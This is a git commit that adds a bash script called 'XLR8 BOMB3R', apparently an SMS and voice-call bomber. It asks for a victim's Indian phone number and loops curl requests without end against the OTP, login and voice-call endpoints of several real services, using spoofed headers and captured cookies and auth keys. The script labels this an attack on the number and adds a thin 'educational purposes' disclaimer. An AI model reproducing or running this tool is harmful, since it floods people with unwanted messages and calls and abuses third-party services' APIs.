bf2d0f17a4a54be0db36ce1c644e24195a78272e
Anubhav Kashyap <61369802+anubhavanonymous@users.noreply.github.com>
2020-11-15 13:37:46 +0530

    Add files via upload

---
+++ xlr8.sh
@@ -0,0 +1,122 @@
+#!/bin/bash
+#Coded by Anubhav Kashyap
+#Dont try to Steal it Bitch
+clear
+echo ""
+echo ""
+printf  "                \e[1;33m|G|e|a|r|i|n|g| |u|p| |t|h|e| |B|o|m|b|e|r|"
+echo ""
+echo ""
+echo ""
+apt install ruby
+apt install figlet
+gem install lolcat
+
+banner() {
+
+echo -e "\e[1;34m‎‎‏‏‎ ‎"
+#After \e[1;34m a blank character is used to give purple colour to banner
+figlet -c XLR8 BOMB3R
+sleep 1
+echo -e "                                         \e[91mAuthor:Anubhav Kashyap"
+sleep 1
+echo -e "                                         \e[36mGroup:Deepweb Shadows"
+echo ""
+
+}
+
+
+menu(){
+clear
+banner
+printf "\e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m\n"
+read -p '---------------> ' num
+printf "\n"
+printf ">~~~>\e[1;92m Starting Attack On +91$num \e[0m<~~~<"
+sleep 5
+echo ""
+echo ""
+printf "\n"
+printf "Press ctrl+c to quit ! \n"
+sleep 3
+opr
+}
+
+opr(){
+
+while true
+do
+curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber=$num&page=free-trial-classes" > /dev/null 2>&1
+curl --http2 -X POST -H "Host:api.doubtnut.com" -H "content-length:32" -H "origin:https://doubtnut.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "accept:*/*" -H "referer:https://doubtnut.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -d "phone_number=$num&is_web=3" "https://api.doubtnut.com/v4/student/login" > /dev/null 2>&1
+curl --http2 -X GET -H "Host:www.smileyo.in" -H "accept:*/*" -H "dnt:1" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "referer:https://www.smileyo.in/my-account" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:ci_session=106acee7a72c96284b17c67857880be571aebe02" -H "cookie:_ga=GA1.1.97633685.1604654964" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1604654969572.2144587212" -H "cookie:_ga_NHZ9GNH3E2=GS1.1.1604654964.1.1.1604655005.0" "https://www.smileyo.in/Ajaxcontroller/send_otp?name=Jwjskwnsbsbs&mobile=$num&email=wyuwiswownn" > /dev/null 2>&1
+curl --http2 -X POST -H "Host:bcas-prod.byjusweb.com" -H "content-length:46" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -d "phoneNumber=$num&page=free-trial-classes" "https://bcas-prod.byjusweb.com/api/send-otp" > /dev/null 2>&1
+curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "if-none-match:W/"35-4XWAN6SOlwXqB4cG29ZwtC1e96w"" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber=$num&page=free-trial-classes" > /dev/null 2>&1
+curl --http2 -X GET -H "Host:m.netmeds.com" -H "accept:application/json, text/plain, */*" -H "dnt:1" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "referer:https://m.netmeds.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gcl_au=1.1.1622875400.1605252639" -H "cookie:_ALGOLIA=anonymous-408779d3-086b-43f1-bdc8-e3593c16ace4" -H "cookie:_ga=GA1.2.1678001414.1605252641" -H "cookie:_gid=GA1.2.735651441.1605252641" -H "cookie:_ga=GA1.3.1678001414.1605252641" -H "cookie:_gid=GA1.3.735651441.1605252641" -H "cookie:bsUl=0" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:_fbp=fb.1.1605252643309.1794174605" -H "cookie:_gat=1" -H "cookie:bsCoId=3605252647100" -H "cookie:G_ENABLED_IDPS=google" "https://m.netmeds.com/mst/rest/v1/id/details/$num" > /dev/null 2>&1
+curl --http2 -X POST -H "Host:www.extramarks.com" -H "content-length:104" -H "accept:application/json, text/javascript, */*; q=0.01" -H "origin:https://www.extramarks.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.extramarks.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:PHPSESSID=6s37n6hk7qp7b3075930n3hkj1" -H "cookie:_fbp=fb.1.1605168090001.1471940270" -H "cookie:_gcl_au=1.1.1103104302.1605168098" -H "cookie:_ga=GA1.2.612359166.1605168098" -H "cookie:_gid=GA1.2.1103406784.1605168098" -d "user_mobile=$num&otp_type=send_otp_reg&mobile_code=%2B91&display_name=Jsjsosks+jdidosbsh&email_id=" "https://www.extramarks.com/user/otpverification/$num" > /dev/null 2>&1
+curl --http2 -X POST -H "Host:grofers.com" -H "content-length:21" -H "lon:77.040489" -H "device_id:eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "origin:https://grofers.com" -H "auth_key:e8d5c291c3416319fd2b053ecc0ee79af838a0f756c66102d9423f106adf2020" -H "content-type:application/x-www-form-urlencoded" -H "app_client:consumer_web" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36" -H "lat:28.4465616" -H "save-data:on" -H "accept:*/*" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-GB,en;q=0.9,en-US;q=0.8,hi;q=0.7,nl;q=0.6" -H "cookie:__cfduid=d62ea9fb03327dcae3aa1cba67e0f91301604675192" -H "cookie:gr_1_deviceId=eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "cookie:city=" -H "cookie:gr_1_lat=28.4640810758775" -H "cookie:gr_1_lon=76.9942133969929" -H "cookie:gr_1_locality=1849" -H "cookie:rl_anonymous_id=%22ab624d9b-e087-411f-a8bf-f08581546149%22" -H "cookie:rl_user_id=%22%22" -H "cookie:ajs_anonymous_id=%22ce3b5e10-7c3b-4610-8303-d500457cb41e%22" -H "cookie:_gcl_au=1.1.1929301394.1604675198" -H "cookie:_uetsid=ac907fd0204111eb9262e7d445132e1e" -H "cookie:_uetvid=ac91bbd0204111ebaafb6796af997a23" -H "cookie:_ga=GA1.2.130807837.1604675201" -H "cookie:_gid=GA1.2.64916838.1604675201" -H "cookie:_gat_UA-85989319-1=1" -H "cookie:_sp_ses.bf41=*" -H "cookie:_sp_id.bf41=4dc20d20fcb0652e.1604675201.1.1604675201.1604675201.034e7d91-2e1c-4eb7-b45b-f7c9b2ee0f66" -H "cookie:WZRK_G=868a56a537564440994a9066a4c0e429" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:__insp_wid=180455199" -H "cookie:__insp_slim=1604675203427" -H "cookie:__insp_nv=true" -H "cookie:__insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS8%3D" -H "cookie:__insp_targlpt=T25saW5lIEdyb2NlcnkgU3RvcmU6IEJ1eSBPbmxpbmUgR3JvY2VyeSBmcm9tIEluZGlhJ3MgQmVzdCBPbmxpbmUgU3VwZXJtYXJrZXQgYXQgRGlzY291bnRlZCBSYXRlcyB8IEdyb2ZlcnM%3D" -H "cookie:_fbp=fb.1.1604675203579.255825096" -H "cookie:_hjid=fb662ad7-5b30-445d-899b-7e9b250c4117" -H "cookie:_hjFirstSeen=1" -H "cookie:_hjAbsoluteSessionInProgress=0" -H "cookie:__insp_norec_sess=true" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%2C%22s%22%3A1604675204%2C%22t%22%3A1604675211%7D" -H "cookie:__cfruid=0f71c77563be257eb5ad6aa54858ad4eb0b62ae4-1604675224" -d "user_phone=$num" "https://grofers.com/v2/accounts/" > /dev/null 2>&1
+curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber=$num&page=free-trial-classes" > /dev/null 2>&1
+done
+
+}
+
+
+menux() {
+
+clear
+apt install curl
+clear
+banner
+sleep 1
+date
+echo "------------------------------"
+printf "\e[1;33mThis tool is only for Educational Purposes !!\e[0m"
+echo ""
+echo "------------------------------"
+echo -e "\e[34mThis Bomber Only Works In India :)"
+echo "------------------------------"
+echo ""
+sleep 1
+printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
+printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;93m UPDATE \e[0m\n"
+printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
+printf "\n"
+read -p 'Select Option !! >>> ' options
+
+if [ "$options" -eq "1" ];then
+        menu
+fi
+if [ "$options" -eq "2" ];then
+clear
+apt install git -y
+clear
+figlet -c Updating Script !
+echo ""
+echo ""
+echo -e "\e[1;34m Requesting Update From Source..."
+echo -e "\e[1;34m Request Attempt Successful.."
+echo -e "\e[1;34m Updating Now..."
+sleep 4
+cd ..
+rm -rf XLR8_BOMB3R
+git clone https://github.com/anubhavanonymous/XLR8_BOMB3R
+cd XLR8_BOMB3R
+chmod +x xlr8.sh
+figlet -c Script Updated !
+sleep 2
+bash xlr8.sh
+
+
+fi
+
+if [ "$options" -eq "3" ];then
+        exit
+        exit
+        exit
+else
+        menux
+fi
+
+
+}
+
+menux
